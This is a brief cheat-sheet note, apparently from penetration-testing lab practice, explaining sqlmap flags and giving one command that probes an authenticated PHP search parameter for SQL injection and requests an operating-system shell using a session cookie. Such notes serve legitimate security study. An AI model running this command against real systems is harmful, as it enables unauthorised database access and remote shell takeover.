# Sqlmap

Is used to check php route parameter for sql vulnerabilities.

<ul>
<li>-u url to the website</li>
<li>--data dummy data to specify the route paramter that should be tested</li>
<li>--cookie a cookie to check websites that require authentication</li>
<li>--os-shell to check for vulnerabilities that provide a shell</li>
</ul>


## Example

We have the following URL: `http://10.129.126.145/dashboard.php?search=test`. The website requires authenthication. We want to check if the `search` parameter is vulnerable to sql injection.

Syntax:
```bash
sqlmap --os-shell -u http://10.129.126.145/dashboard.php --data "search=blah" --cookie="PHPSESSID=a9rsdu13tva4e172rn4jj6dlqf"
```

## Resources
https://abrictosecurity.com/sqlmap-cheatsheet-and-examples/
